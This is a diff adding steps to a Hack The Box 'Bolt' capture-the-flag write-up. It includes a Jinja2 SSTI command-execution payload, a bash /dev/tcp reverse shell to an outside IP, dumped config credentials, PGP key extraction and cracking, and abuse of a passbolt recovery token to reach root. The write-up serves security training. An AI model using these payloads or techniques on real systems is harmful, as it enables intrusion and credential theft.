@@ -9,7 +9,7 @@ menu:
     parent: htb-machines-linux
     weight: 10
 hero: images/bolt.png
-tags: ["HTB"]
+tags: ["HTB", "vhosts", "docker", "docker-tar", "roundcube", "webmail", "passbolt", "dive", "sqlite", "hashcat", "source-code", "ssti", "payloadsallthethings", "chrome", "john", "python"]
 ---
 
 # Bolt
@@ -370,10 +370,332 @@ Stopped: Mon Sep 25 17:25:42 2023
 
 9 directories, 10 files
 ```
+
+- If we check the `routes.py` in `base`, we have a code for registration: `XNSS-HSJW-3NGU-8XTJ`
+```
+@blueprint.route('/register', methods=['GET', 'POST'])
+def register():
+    login_form = LoginForm(request.form)
+    create_account_form = CreateAccountForm(request.form)
+    if 'register' in request.form:
+
+        username  = request.form['username']
+        email     = request.form['email'   ]
+        code      = request.form['invite_code']
+        if code != 'XNSS-HSJW-3NGU-8XTJ':
+            return render_template('code-500.html')
+        data = User.query.filter_by(email=email).first()
+        if data is None and code == 'XNSS-HSJW-3NGU-8XTJ':
+            # Check usename exists
+            user = User.query.filter_by(username=username).first()
+            if user:
+                return render_template( 'accounts/register.html', 
+                                    msg='Username already registered',
+                                    success=False,
+                                    form=create_account_form)
+
+            # Check email exists
+            user = User.query.filter_by(email=email).first()
+            if user:
+                return render_template( 'accounts/register.html', 
+                                    msg='Email already registered', 
+                                    success=False,
+                                    form=create_account_form)
+
+            # else we can create the user
+            user = User(**request.form)
+            db.session.add(user)
+            db.session.commit()
+
+            return render_template( 'accounts/register.html', 
+                                msg='User created please <a href="/login">login</a>', 
+                                success=True,
+                                form=create_account_form)
+
+    else:
+        return render_template( 'accounts/register.html', form=create_account_form)
+
+```
+
+- Let's register in `demo.bolt.htb` using the code
+
+![](./images/12.png)
+
+![](./images/13.png)
+
+- The page has nothing interesting
+  - So we return back to the code
+  - We have a `home/routes.py`
+    - https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti
+```
+@blueprint.route('/confirm/changes/<token>')
+def confirm_changes(token):
+    """Confirmation Token"""
+    try:
+        email = ts.loads(token, salt="changes-confirm-key", max_age=86400)
+    except:
+        abort(404)
+    user = User.query.filter_by(username=email).first_or_404()
+    name = user.profile_update
+    template = open('templates/emails/update-name.html', 'r').read()
+    msg = Message(
+            recipients=[f'{user.email}'],
+            sender = 'support@example.com',
+            reply_to = 'support@example.com',
+            subject = "Your profile changes have been confirmed."
+        )
+    msg.html = render_template_string(template % name)
+    mail.send(msg)
+
+    return render_template('index.html')
+
+```
+
+- So we have a possible `SSTI`
+  - It can be trigered via changing profile settings
+  - To be specific `Name` parameter
+
+![](./images/14.png)
+
+![](./images/16.png)
+
+![](./images/15.png)
+
+![](./images/17.png)
+
+- It looks like it works
+  - https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#jinja2-python
+  - The payload: `{{ namespace.__init__.__globals__.os.popen('id').read() }}`
+
+![](./images/18.png)
+
+- Let's get reverse shell
+  - `{{ namespace.__init__.__globals__.os.popen('bash -c "bash -i >& /dev/tcp/10.10.16.9/6666 0>&1"').read() }}`
+
+![](./images/19.png)
+
 ## User
+- Enumerate
+```
+www-data@bolt:~$ cat /var/www/dev/config.py
+cat dev/config.py
+"""Flask Configuration"""
+#SQLALCHEMY_DATABASE_URI = 'sqlite:///database.db'
+SQLALCHEMY_DATABASE_URI = 'mysql://bolt_dba:dXUUHSW9vBpH5qRB@localhost/boltmail'
+SQLALCHEMY_TRACK_MODIFICATIONS = True
+SECRET_KEY = 'kreepandcybergeek'
+MAIL_SERVER = 'localhost'
+MAIL_PORT = 25
+MAIL_USE_TLS = False
+MAIL_USE_SSL = False
+#MAIL_DEBUG = app.debug
+MAIL_USERNAME = None
+MAIL_PASSWORD = None
+DEFAULT_MAIL_SENDER = 'support@bolt.htb'
+```
+```
+www-data@bolt:~$ cat /var/www/demo/config.py
+cat demo/config.py
+"""Flask Configuration"""
+#SQLALCHEMY_DATABASE_URI = 'sqlite:///database.db'
+SQLALCHEMY_DATABASE_URI = 'mysql://bolt_dba:dXUUHSW9vBpH5qRB@localhost/boltmail'
+SQLALCHEMY_TRACK_MODIFICATIONS = True
+SECRET_KEY = 'kreepandcybergeek'
+MAIL_SERVER = 'localhost'
+MAIL_PORT = 25
+MAIL_USE_TLS = False
+MAIL_USE_SSL = False
+#MAIL_DEBUG = app.debug
+MAIL_USERNAME = None
+MAIL_PASSWORD = None
+DEFAULT_MAIL_SENDER = 'support@bolt.htb'
+```
+```
+www-data@bolt:~$ cat /var/www/roundcube/config/config.inc.php
+cat roundcube/config/config.inc.php
+<?php
 
+/* Local configuration for Roundcube Webmail */
 
+// ----------------------------------
+// SQL DATABASE
+// ----------------------------------
+// Database connection string (DSN) for read+write operations
+// Format (compatible with PEAR MDB2): db_provider://user:password@host/database
+// Currently supported db_providers: mysql, pgsql, sqlite, mssql, sqlsrv, oracle
+// For examples see http://pear.php.net/manual/en/package.database.mdb2.intro-dsn.php
+// Note: for SQLite use absolute path (Linux): 'sqlite:////full/path/to/sqlite.db?mode=0646'
+//       or (Windows): 'sqlite:///C:/full/path/to/sqlite.db'
+// Note: Various drivers support various additional arguments for connection,
+//       for Mysql: key, cipher, cert, capath, ca, verify_server_cert,
+//       for Postgres: application_name, sslmode, sslcert, sslkey, sslrootcert, sslcrl, sslcompression, service.
+//       e.g. 'mysql://roundcube:@localhost/roundcubemail?verify_server_cert=false'
+$config['db_dsnw'] = 'mysql://roundcubeuser:WXg5He2wHt4QYHuyGET@localhost/roundcube';
+// $config['enable_installer'] = true;
+// Log sent messages to <log_dir>/sendmail.log or to syslog
+$config['smtp_log'] = false;
+```
+
+- None of these passwords work
+  - But we also have `passbolt`
+  - `/etc/passbolt/passbolt.php`
+```
+...
+
+    // Database configuration.
+    'Datasources' => [
+        'default' => [
+            'host' => 'localhost',
+            'port' => '3306',
+            'username' => 'passbolt',
+            'password' => 'rT2;jW7<eY8!dX8}pQ8%',
+            'database' => 'passboltdb',
+        ],
+    ],
+
+...
+```
+
+- And it works for `eddie`
+  - Let's connect via `ssh`
+
+![](./images/20.png)
 
 
 ## Root
+- We have a message from the `clark`
 
+![](./images/21.png)
+
+- Looks like we should look for a key
+  - We have `.config` folder in `eddie`'s home
+  - Inside we have `google-chrome`
+    - Related to the message we saw from `clark`
+  - `clark` mentioned plugins/extensions
+    - We have 3
+```
+eddie@bolt:~$ ls -lha /home/eddie/.config/google-chrome/Default/Extensions/
+total 20K
+drwx------  5 eddie eddie 4.0K Feb 25  2021 .
+drwx------ 23 eddie eddie 4.0K Aug  4  2021 ..
+drwx------  3 eddie eddie 4.0K Feb 25  2021 didegimhafipceonhjepacocaffmoppf
+drwx------  3 eddie eddie 4.0K Feb 25  2021 nmmhkkegccagdldgiimedpiccmgmieda
+drwx------  3 eddie eddie 4.0K Feb 25  2021 pkedcjkdefgpdelpbcmbmeomcjbeemfm
+```
+
+- Let's find the `passbolt` extension
+```
+eddie@bolt:~/.config/google-chrome/Default/Extensions$ grep -ir passbolt | cut -d'/' -f1 | uniq
+didegimhafipceonhjepacocaffmoppf
+```
+
+- Now let's look for key
+```
+eddie@bolt:~/.config/google-chrome/Default$ grep -nr "didegimhafipceonhjepacocaffmoppf" . | cut -d'/' -f2 | uniq
+Favicons matches
+Preferences:1:{"account_id_migration_state":2,"account_tracker_service_last_update":"13258762424334951","alternate_error_pages":{"backup":true},"announcement_notification_service_first_run_time":"13258762424167263","autocomplete":{"retention_policy_last_version":88},"autofill":{"orphan_rows_removed":true},"browser":{"has_seen_welcome_page":true,"window_placement":{"bottom":1045,"left":429,"maximized":true,"right":1239,"top":39,"work_area_bottom":1200,"work_area_left":72,"work_area_right":1920,"work_area_top":27}},"countryid_at_install":21843,"custom_links":{"initialized":true,"list":[{"isMostVisited":true,"title":"Passbolt","url":"https:
+History Provider Cache matches
+DownloadMetadata matches
+History matches
+shared_proto_db
+Local Extension Settings
+Sessions
+```
+```
+eddie@bolt:~/.config/google-chrome/Default$ grep -n "PRIVATE" "Local Extension Settings/didegimhafipceonhjepacocaffmoppf/000003.log"
+Binary file Local Extension Settings/didegimhafipceonhjepacocaffmoppf/000003.log matches
+```
+
+- We found a key inside using `strings "Local Extension Settings/didegimhafipceonhjepacocaffmoppf/000003.log | less`
+
+![](./images/22.png)
+
+- Let's crack it
+```
+└─$ gpg2john priv.key > priv.key.hash
+
+File priv.key
+```
+```
+└─$ john --wordlist=/usr/share/wordlists/rockyou.txt priv.key.hash            
+Using default input encoding: UTF-8
+Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
+Cost 1 (s2k-count) is 16777216 for all loaded hashes
+Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 8 for all loaded hashes
+Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+0g 0:00:04:00 0.08% (ETA: 2023-09-30 02:25) 0g/s 60.41p/s 60.41c/s 60.41C/s teamoj..taztaz
+0g 0:00:04:03 0.08% (ETA: 2023-09-30 02:22) 0g/s 60.42p/s 60.42c/s 60.42C/s langlang..lamont1
+merrychristmas   (Eddie Johnson)     
+1g 0:00:11:49 DONE (2023-09-26 19:07) 0.001409g/s 60.39p/s 60.39c/s 60.39C/s merrychristmas..menudo
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+```
+
+- We need this key to able to recover the password
+  - https://community.passbolt.com/t/recover-account-on-a-network-without-email/1394
+  - We have to visit https://passbolt.bolt.htb/ and enter `eddie@bolt.htb`
+  - Then we connect to `db` to retrieve `user_id` and `token`
+
+```
+eddie@bolt:~/.config/google-chrome/Default$ mysql -u passbolt -p'rT2;jW7<eY8!dX8}pQ8%' passboltdb
+mysql: [Warning] Using a password on the command line interface can be insecure.
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 379
+Server version: 8.0.26-0ubuntu0.20.04.2 (Ubuntu)
+
+Copyright (c) 2000, 2021, Oracle and/or its affiliates.
+
+Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective
+owners.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+mysql> select id from users where username = 'eddie@bolt.htb';
++--------------------------------------+
+| id                                   |
++--------------------------------------+
+| 4e184ee6-e436-47fb-91c9-dccb57f250bc |
++--------------------------------------+
+1 row in set (0.00 sec)
+
+mysql> select token from authentication_tokens where user_id = '4e184ee6-e436-47fb-91c9-dccb57f250bc' and type = 'recover';
+Empty set (0.00 sec)
+
+mysql> select token from authentication_tokens where user_id = '4e184ee6-e436-47fb-91c9-dccb57f250bc' and type = 'recover';
++--------------------------------------+
+| token                                |
++--------------------------------------+
+| 2b4571b7-6cb7-4572-b1d2-ea7bdc9e8388 |
++--------------------------------------+
+1 row in set (0.00 sec)
+
+mysql> 
+```
+
+- So the link we have to visit is `https://passbolt.bolt.htb/setup/recover/4e184ee6-e436-47fb-91c9-dccb57f250bc/2b4571b7-6cb7-4572-b1d2-ea7bdc9e8388`
+  - When we visit the link we have to install the extension
+  - After installation, we have window with `Private key` 
+
+![](./images/23.png)
+
+![](./images/24.png)
+
+- After entering the private key, we are asked a passphrase, that we cracked before
+  - Enter passphrase and click `Next`
+  - Then click `Next` again
+
+![](./images/25.png)
+
+- Now we have an access to password manager
+
+![](./images/26.png)
+
+- Switch to `root` and get flag
+
+![](./images/27.png)
